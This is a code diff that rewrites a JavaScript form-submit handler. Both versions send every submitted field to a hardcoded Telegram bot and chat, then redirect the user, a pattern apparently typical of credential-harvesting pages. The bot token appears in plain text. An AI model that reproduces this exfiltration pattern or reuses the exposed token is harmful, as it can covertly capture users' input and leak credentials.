@@ -1,55 +1,43 @@
-const botToken = '6331823095:AAGCI0yP2ZXroAUMtassDfqmnkrJIMp908I';
-const chatId = '6711432012';
-
-const sendTelegramMessage = (formData) => {
-    let message = "";
-
-    for (const key in formData) {
-        if (formData.hasOwnProperty(key)) {
-            message += `${key}: \`${formData[key]}\`\n`;
-        }
-    }
-
-    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const postData = `chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-    fetch(telegramApiUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: postData
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Error sending message to Telegram bot.');
-        }
-        return response.json();
-    })
-    .then(data => {
-        console.log(data);
-    })
-    .catch(error => {
-        console.error(error);
-    });
-};
-
 document.getElementById("telegram").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent the default form submission
+  event.preventDefault(); // Prevent the form from submitting normally
 
-    const formData = new FormData(event.target);
-    let formDataObject = {};
-    formData.forEach((value, key) => {
-        formDataObject[key] = value;
-    });
-    
-    sendTelegramMessage(formDataObject);
+  // Get the form data
+  var formData = new FormData(this);
+  var message = "";
 
-    // Extract the redirect URL from the custom attribute
-    const redirectUrl = event.target.getAttribute('data-redirect');
+  // Construct the message
+  for (var pair of formData.entries()) {
+    message += pair[0] + ": `" + pair[1] + "`\n";
+  }
 
-    // Redirect the user to the specified URL after form submission
-    if (redirectUrl) {
-        window.location.href = redirectUrl;
+  // Your Telegram bot API token
+  var token = "6331823095:AAGCI0yP2ZXroAUMtassDfqmnkrJIMp908I";
+
+  // Your Telegram chat ID
+  var chatId = "6711432012";
+
+  // Get the redirect link from the form's data attribute
+  var redirectLink = this.getAttribute('data-redirect');
+
+  // Construct the URL for sending the message to Telegram
+  var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+  // Data to be sent
+  var data = {
+    chat_id: chatId,
+    text: message,
+    parse_mode: 'Markdown'
+  };
+
+  // Send the message using AJAX
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", url, true);
+  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      // Redirect to the specified link after form submission
+      window.location.href = redirectLink;
     }
+  };
+  xhr.send(JSON.stringify(data));
 });
